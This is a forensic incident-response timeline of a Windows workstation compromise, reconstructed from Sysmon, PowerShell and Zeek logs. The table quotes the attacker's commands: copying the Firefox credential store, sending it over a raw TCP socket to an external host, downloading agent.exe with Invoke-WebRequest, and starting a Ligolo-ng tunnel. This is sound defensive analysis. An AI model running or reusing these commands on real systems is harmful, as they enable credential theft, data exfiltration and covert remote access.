# Case 003 — Chronological Timeline Reconstruction

This document reconstructs the minute-by-minute timeline of credential staging, socket exfiltration, and tool ingress on workstation `IT-ADMIN01` (`10.10.35.18`). All times are indexed relative to $T_0$ (Case 001 reverse shell establishment).

---

## 1. Chronological Timeline Table

| Relative Time | Source Subsystem | Event / Detection ID | Observed Telemetry Evidence (Facts Only) | Analytical Interpretation |
| :--- | :--- | :--- | :--- | :--- |
| **$T_0 + 6\text{m } 12\text{s}$** | `IT-ADMIN01` Sysmon | `A06` (Event ID 1) | `xcopy.exe /E /I /Y ...\Firefox\Profiles\waut035y.default-release C:\Users\Public\firefox_profile\`. | Attacker copies Firefox browser profile (including `logins.json` and `key4.db`) to public staging directory. |
| **$T_0 + 6\text{m } 45\text{s}$** | `IT-ADMIN01` PowerShell | `A07` (Event ID 4104) | ScriptBlock 4104: `Compress-Archive -Path "C:\Users\Public\firefox_profile\*" -DestinationPath "...\firefox_profile.zip"`. | Attacker compresses harvested browser files into a single ZIP archive for efficient network transfer. |
| **$T_0 + 7\text{m } 10\text{s}$** | `IT-ADMIN01` PowerShell | `A07` (Event ID 4104) | ScriptBlock 4104: Instantiates `System.Net.Sockets.TcpClient("203.0.113.25", 9999)` and writes file byte stream. | Attacker opens raw unencrypted TCP socket directly to external Kali listener and transmits archive bytes. |
| **$T_0 + 7\text{m } 12\text{s}$** | `ZEEK-SENSOR01` | `A07` (`conn.log`) | Zeek session on `203.0.113.25:9999`, `duration=4.2s`, `orig_bytes=1,482,109` (~1.48 MB). | Network NDR confirms completion of 1.48 MB outbound data transmission to external threat server. |
| **$T_0 + 7\text{m } 30\text{s}$** | Attacker Machine (Kali) | External Activity | *[Zero Telemetry on Internal Sensors]* Attacker runs `firefox_decrypt` on stolen `firefox_profile.zip`. | Attacker recovers plaintext password for Linux user `thanh` offline. *(Forensic inference validated in Case 004)*. |
| **$T_0 + 8\text{m } 20\text{s}$** | `IT-ADMIN01` PowerShell | `A08` (Event ID 4104) | ScriptBlock 4104: `Invoke-WebRequest -Uri "http://203.0.113.25:8080/agent.exe" -OutFile "C:\Users\Public\agent.exe"`. | Attacker downloads Ligolo-ng reverse tunneling agent binary to staging directory. |
| **$T_0 + 8\text{m } 45\text{s}$** | `IT-ADMIN01` Sysmon | `A08` (Event ID 1 & 3) | `agent.exe -connect 203.0.113.25:11601 -ignore-cert`. Outbound TCP connection established to port `11601`. | Attacker executes tunneling utility, establishing an encrypted multiplexed routing tunnel to Kali. |

---

## 2. Chronological Analysis
* **Staging to Exfiltration Duration**: The elapsed time between `xcopy` profile staging ($T+6\text{m } 12\text{s}$) and network socket transmission ($T+7\text{m } 10\text{s}$) was **58 seconds**.
* **Tool Ingress**: Within **70 seconds** of exfiltrating the browser profile, the attacker initiated the download of `agent.exe` to weaponize the foothold.
